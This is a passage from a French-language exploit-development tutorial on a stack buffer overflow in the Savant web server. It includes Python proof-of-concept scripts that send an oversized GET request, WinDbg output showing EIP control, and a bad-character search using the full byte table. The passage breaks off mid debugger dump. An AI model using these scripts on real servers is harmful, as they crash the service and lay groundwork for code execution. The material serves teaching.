<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">size</span>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span>
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sending buffer...&quot;</span><span class="p">)</span>
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Done!&quot;</span><span class="p">)</span>
<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>
<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not connect!&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Si on s'attache au service avec WinDbg et qu'on exécute cette preuve de concept, on obtient le résultat suivant :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">(</span><span class="n">1618</span><span class="p">.</span><span class="n">dbc</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Savant</span><span class="p">\</span><span class="n">Savant</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">ffffffff</span> <span class="n">ebx</span><span class="p">=</span><span class="n">017d5778</span> <span class="n">ecx</span><span class="p">=</span><span class="n">f1d59770</span> <span class="n">edx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">esi</span><span class="p">=</span><span class="n">017d5778</span> <span class="n">edi</span><span class="p">=</span><span class="n">0041703c</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">41414141</span> <span class="n">esp</span><span class="p">=</span><span class="n">045fea2c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">41414141</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">41414141</span> <span class="p">??</span>              <span class="p">???</span>
</code></pre></div>
<p>À première vue c'est un dépassement de tampon classique avec contrôle sur <code>EIP</code>. Après analyse ce n'est pas le cas :</p>
<ul>
<li>Dans les dépassements de tampon classique, le registre <code>ESP</code> pointe sur notre <em>buffer</em> qui va stocker notre <em>shellcode</em></li>
<li>Le buffer réécrirait <code>EIP</code> avec <code>JMP ESP</code> qui redirigerait le flot d'exécution</li>
</ul>
<p>Si on analyse le contenu de <code>ESP</code> on se rend compte qu'il ne contient que trois <em>bytes</em> de notre <em>shellcode</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">0</span><span class="p">:</span><span class="n">002</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="nv">@esp</span> <span class="n">L5</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">045fea2c</span>  <span class="n">00414141</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x14141</span>           <span class="c"># Seulement 3x `41`</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">045fea30</span>  <span class="n">045fea84</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">045fea34</span>  <span class="n">0041703c</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x1703c</span>
</code></pre></div>
<p>Notre <em>buffer</em> est traité comme un <em>string</em> en mémoire et fini donc par <code>00</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dds</span> <span class="nv">@esp</span> <span class="n">L2</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">0470ea2c</span>  <span class="n">00414141</span> <span class="n">Savant</span><span class="p">+</span><span class="n">0x14141</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">0470ea30</span>  <span class="n">0470ea84</span>
</code></pre></div>
<h3 id="identifier-les-mauvais-caracteres">Identifier les mauvais caractères</h3>
<p>On modifie la preuve de concept afin d'inclure l'ensemble des caractères possible :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="ch">#!/usr/bin/python                                                                                                           </span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>  <span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c</span><span class="s2">&quot;</span>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19</span><span class="s2">&quot;</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26</span><span class="s2">&quot;</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33</span><span class="s2">&quot;</span>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&quot;</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d</span><span class="s2">&quot;</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a</span><span class="s2">&quot;</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67</span><span class="s2">&quot;</span>
<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74</span><span class="s2">&quot;</span>
<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81</span><span class="s2">&quot;</span>
<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e</span><span class="s2">&quot;</span>
<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b</span><span class="s2">&quot;</span>
<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8</span><span class="s2">&quot;</span>
<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5</span><span class="s2">&quot;</span>
<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2</span><span class="s2">&quot;</span>
<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf</span><span class="s2">&quot;</span>
<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc</span><span class="s2">&quot;</span>
<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9</span><span class="s2">&quot;</span>
<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6</span><span class="s2">&quot;</span>
<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>
<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="n">badchars</span>
<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
</code></pre></div>
<p>Si on lance tel quel le programme ne crash pas, indiquant la présence d'un mauvais caractère. On commente la première moitié des caractères pour identifier où se trouve le caractère problématique.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">260</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>  <span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1">#    b&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c&quot;</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1">#    b&quot;\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19&quot;</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1">#    b&quot;\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26&quot;</span>
<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="c1">#    b&quot;\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33&quot;</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1">#    b&quot;\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="c1">#    b&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d&quot;</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="c1">#    b&quot;\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a&quot;</span>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1">#    b&quot;\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67&quot;</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="c1">#    b&quot;\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74&quot;</span>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="c1">#    b&quot;\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81&quot;</span>
<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e</span><span class="s2">&quot;</span>             <span class="c1"># 2em moitie</span>
<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b</span><span class="s2">&quot;</span>
<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8</span><span class="s2">&quot;</span>
<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5</span><span class="s2">&quot;</span>
<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2</span><span class="s2">&quot;</span>
<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf</span><span class="s2">&quot;</span>
<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc</span><span class="s2">&quot;</span>
<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9</span><span class="s2">&quot;</span>
<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6</span><span class="s2">&quot;</span>
<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>    <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;GET /&quot;</span>
<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="n">badchars</span>
<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
</code></pre></div>
<p>On relance l'exploit et on a bien un dépassement. Il n'y a donc aucun mauvais caractère dans cette deuxième moitié :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Affichage de ESP</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">esp</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">0466ea2c</span>  <span class="n">41</span> <span class="n">41</span> <span class="n">41</span> <span class="n">00</span> <span class="n">84</span> <span class="n">ea</span> <span class="n">66</span> <span class="n">04</span><span class="p">-</span><span class="n">3c</span> <span class="n">70</span> <span class="n">41</span> <span class="n">00</span> <span class="n">78</span> <span class="n">57</span> <span class="n">9e</span> <span class="n">01</span>  <span class="n">AAA</span><span class="p">...</span><span class="n">f</span><span class="p">.&lt;</span><span class="n">pA</span><span class="p">.</span><span class="n">xW</span><span class="p">..</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="p">[...]</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">0466ea7c</span>  <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">02</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span><span class="p">-</span><span class="n">47</span> <span class="n">45</span> <span class="n">54</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span>  <span class="p">........</span><span class="n">GET</span><span class="p">.....</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">0466ea8c</span>  <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span><span class="p">-</span><span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span> <span class="n">00</span>  <span class="p">................</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">0466ea9c</span>  <span class="n">2f</span> <span class="n">82</span> <span class="n">83</span> <span class="n">84</span> <span class="n">85</span> <span class="n">86</span> <span class="n">87</span> <span class="n">88</span><span class="p">-</span><span class="n">89</span> <span class="n">8a</span> <span class="n">8b</span> <span class="n">8c</span> <span class="n">8d</span> <span class="n">8e</span> <span class="n">8f</span> <span class="n">90</span>  <span class="p">/...............</span>             <span class="c"># Début des caractères</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="c">#</span>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="c"># Affichage des caractères complets jusqu&#39;au 1er &#39;A&#39;</span>
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">0466ea9c</span>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="n">0466ea9c</span>  <span class="n">2f</span> <span class="n">82</span> <span class="n">83</span> <span class="n">84</span> <span class="n">85</span> <span class="n">86</span> <span class="n">87</span> <span class="n">88</span><span class="p">-</span><span class="n">89</span> <span class="n">8a</span> <span class="n">8b</span> <span class="n">8c</span> <span class="n">8d</span> <span class="n">8e</span> <span class="n">8f</span> <span class="n">90</span>  <span class="p">/...............</span>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="n">0466eaac</span>  <span class="n">91</span> <span class="n">92</span> <span class="n">93</span> <span class="n">94</span> <span class="n">95</span> <span class="n">96</span> <span class="n">97</span> <span class="n">98</span><span class="p">-</span><span class="n">99</span> <span class="n">9a</span> <span class="n">9b</span> <span class="n">9c</span> <span class="n">9d</span> <span class="n">9e</span> <span class="n">9f</span> <span class="n">a0</span>  <span class="p">................</span>
